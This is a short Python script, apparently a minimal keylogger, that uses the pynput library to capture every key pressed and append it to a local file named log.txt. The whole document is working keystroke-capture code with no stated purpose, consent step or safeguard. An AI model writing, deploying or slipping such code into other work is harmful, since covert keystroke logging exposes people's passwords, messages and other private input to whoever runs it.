from pynput.keyboard import Listener

def writetofile(key):
  keydata = str(key)
  keydata = keydata.replace("'", "")
  with open("log.txt", "a") as f:
    f.write(f"{keydata}\n")

with Listener(on_press=writetofile) as l:
  l.join()
